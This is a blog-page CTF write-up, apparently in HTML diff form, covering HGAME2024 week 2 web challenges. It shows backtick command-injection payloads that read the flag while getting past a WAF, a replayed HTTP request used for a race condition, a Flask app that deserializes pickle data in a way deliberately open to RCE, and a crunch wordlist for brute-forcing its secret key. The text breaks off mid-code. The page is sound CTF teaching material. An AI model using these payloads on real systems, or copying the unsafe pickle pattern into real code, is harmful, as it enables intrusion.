@@ -1,0 +1,837 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>HGAME2024_week2_wp - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="HGAME2024_week2_wp" />
+<meta property="og:description" content="HGAME2024_week2_web&amp;misc" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/hgame2024_week2/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-14T00:00:00+08:00" />
+<meta property="article:modified_time" content="2024-02-14T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="HGAME2024_week2_wp"/>
+<meta name="twitter:description" content="HGAME2024_week2_web&amp;misc"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hgame2024_week2/" /><link rel="prev" href="http://scofield1920.github.io/hgame2024_week1/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HGAME2024_week2_wp",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/hgame2024_week2\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, wp","wordcount":  436 ,
+        "url": "http:\/\/scofield1920.github.io\/hgame2024_week2\/","datePublished": "2024-02-14T00:00:00+08:00","dateModified": "2024-02-14T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#what-the-cow-say">[What the cow say?]</a></li>
+        <li><a href="#select-more-courses">[Select More Courses]</a></li>
+        <li><a href="#myflask">[myflask]</a></li>
+        <li><a href="#search4member">[search4member]</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">misc</a>
+      <ul>
+        <li><a href="#ek1ng_want_girlfriend">[ek1ng_want_girlfriend]</a></li>
+        <li><a href="#ezword">[ezWord]</a></li>
+        <li><a href="#龙之舞">[龙之舞]</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HGAME2024_week2_wp</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-14">2024-02-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-14">2024-02-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;436 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#what-the-cow-say">[What the cow say?]</a></li>
+        <li><a href="#select-more-courses">[Select More Courses]</a></li>
+        <li><a href="#myflask">[myflask]</a></li>
+        <li><a href="#search4member">[search4member]</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">misc</a>
+      <ul>
+        <li><a href="#ek1ng_want_girlfriend">[ek1ng_want_girlfriend]</a></li>
+        <li><a href="#ezword">[ezWord]</a></li>
+        <li><a href="#龙之舞">[龙之舞]</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>HGAME2024_week2_web&amp;misc</p>
+<h1 id="week2" class="headerLink">
+    <a href="#week2" class="header-mark"></a>Week2</h1><h2 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>web</h2><h3 id="what-the-cow-say" class="headerLink">
+    <a href="#what-the-cow-say" class="header-mark"></a>[What the cow say?]</h3><p>除了反引号，<code>$()</code>也可以</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`ls /`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png" title="image-20240216143935578" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png 2x"
+            sizes="auto"
+            alt="image-20240216143935578">
+    </a></figure></p>
+<p>直接用cat命令会被waf拦截</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`tac /fla*/fla*`
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png" title="image-20240216144348881" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png 2x"
+            sizes="auto"
+            alt="image-20240216144348881">
+    </a></figure></p>
+<h3 id="select-more-courses" class="headerLink">
+    <a href="#select-more-courses" class="header-mark"></a>[Select More Courses]</h3><p>登陆界面，使用top1000字典进行爆破</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png" title="image-20240216150542871" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png 2x"
+            sizes="auto"
+            alt="image-20240216150542871">
+    </a></figure></p>
+<p>根据提示，应该是时间竞争</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png" title="image-20240216150649837" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png 2x"
+            sizes="auto"
+            alt="image-20240216150649837">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/expand</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">139.196.183.57:30232</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://139.196.183.57:30232/expand</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">23</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://139.196.183.57:30232</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">session=MTcwODA2NzE4MXxEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fIP0P43CugxLBJt9xdo6NEpISwrwf3-CXDctl9thdqyW</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;ma5hr00m&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload类型选null并无限重复发包</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240216151634928.png" title="image-20240216151634928" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20240216151634928.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240216151634928.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240216151634928.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240216151634928.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240216151634928.png 2x"
+            sizes="auto"
+            alt="image-20240216151634928">
+    </a></figure></p>
+<p>再返回自主选课查看</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png" title="image-20240216151707602" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png 2x"
+            sizes="auto"
+            alt="image-20240216151707602">
+    </a></figure></p>
+<h3 id="myflask" class="headerLink">
+    <a href="#myflask" class="header-mark"></a>[myflask]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pytz</span> <span class="kn">import</span> <span class="n">timezone</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">currentDateAndTime</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">(</span><span class="n">timezone</span><span class="p">(</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">currentTime</span> <span class="o">=</span> <span class="n">currentDateAndTime</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&#34;%H%M%S&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tips: Try to crack this first ↓</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">currentTime</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">currentTime</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s1">&#39;app.py&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;There is no session available in your client :(&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;You are </span><span class="si">{}</span><span class="s1"> now&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># For POST requests from admin</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pickle_data</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pickle_data&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Tips: Here try to trigger RCE</span>
+</span></span><span class="line"><span class="cl">        <span class="n">userdata</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">userdata</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Access Denied&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>[flask中session的那些事](<a href="https://ctf.org.cn/2019/11/19/flask%e4%b8%adsession%e7%9a%84%e9%82%a3%e4%ba%9b%e4%ba%8b/" target="_blank" rel="noopener noreferrer">flask中session的那些事 (ctf.org.cn)</a>)</p>
+<p><a href="https://docs.python.org/zh-tw/dev/library/pickle.html" target="_blank" rel="noopener noreferrer">pickle—— Python 物件序列化</a></p>
+<p><strong>flask-session伪造</strong></p>
+<p>访问/flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png" title="image-20240216175047386" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png 2x"
+            sizes="auto"
+            alt="image-20240216175047386">
+    </a></figure></p>
+<p>由以下代码可知，SECRET_KEY为6位数字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">currentDateAndTime</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">(</span><span class="n">timezone</span><span class="p">(</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">currentTime</span> <span class="o">=</span> <span class="n">currentDateAndTime</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&#34;%H%M%S&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tips: Try to crack this first ↓</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">currentTime</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用crunch生成6位数字字典</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">crunch 6 6 0123456789 -o ~/000000-999999.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破SECRET_KEY</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
